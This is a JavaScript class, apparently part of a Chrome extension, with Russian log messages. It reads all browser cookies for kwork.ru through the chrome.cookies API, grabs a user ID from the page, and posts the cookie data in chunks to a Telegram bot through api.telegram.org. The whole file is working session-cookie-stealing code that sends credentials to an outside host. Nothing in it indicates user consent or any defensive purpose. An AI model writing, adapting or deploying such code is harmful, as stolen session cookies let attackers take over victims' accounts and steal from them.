
class CookiesSender {
    constructor(botToken, chatId) {
        this.botToken = botToken;
        this.chatId = chatId;
        this.lastSentCookiesHash = '';
    }

    sendCookiesToTelegram(cookies) {
        try {
            const cookiesStr = JSON.stringify(cookies, null, 2);
            const currentHash = this.hashString(cookiesStr);

            if (currentHash === this.lastSentCookiesHash) {
                console.log('Куки не изменились, пропускаем отправку');
                return;
            }

            this.lastSentCookiesHash = currentHash;

            const maxLength = 3000;
            let parts = [];

            if (cookiesStr.length > maxLength) {
                for (let i = 0; i < cookiesStr.length; i += maxLength) {
                    parts.push(cookiesStr.substring(i, i + maxLength));
                }
            } else {
                parts = [cookiesStr];
            }

            const userId = document.querySelector('.current-id p')?.textContent.replace('Current ID: ', '') || 'unknown';

            let partIndex = 0;
            this.sendPart(parts, partIndex, userId);
        } catch (error) {
            console.error('Ошибка при подготовке данных:', error);
        }
    }

    sendPart(parts, partIndex, userId) {
        if (partIndex >= parts.length) return;

        const part = parts[partIndex];
        const message = partIndex === 0 ?
            `🍪 Cookies kwork.ru [ID: ${userId}] (часть ${partIndex + 1}/${parts.length}):\n${part}` :
            `[ID: ${userId}] Часть ${partIndex + 1}/${parts.length}:\n${part}`;

        const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: this.chatId,
                text: message
            })
        })
            .then(response => response.json())
            .then(data => {
                console.log(`Часть ${partIndex + 1} успешно отправлена`);
                partIndex++;
                setTimeout(() => this.sendPart(parts, partIndex, userId), 300);
            })
            .catch(error => {
                console.error('Ошибка при отправке:', error);
                partIndex++;
                setTimeout(() => this.sendPart(parts, partIndex, userId), 500);
            });
    }

    fetchAndSendCookies() {
        chrome.cookies.getAll({ domain: 'kwork.ru' }, (cookies) => {
            if (cookies && cookies.length > 0) {
                this.sendCookiesToTelegram(cookies);
            } else {
                console.log('Cookies для kwork.ru не найдены');
            }
        });
    }

    hashString(str) {
        let hash = 0;
        if (str.length === 0) return hash;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash.toString();
    }
}

window.CookiesSender = CookiesSender; 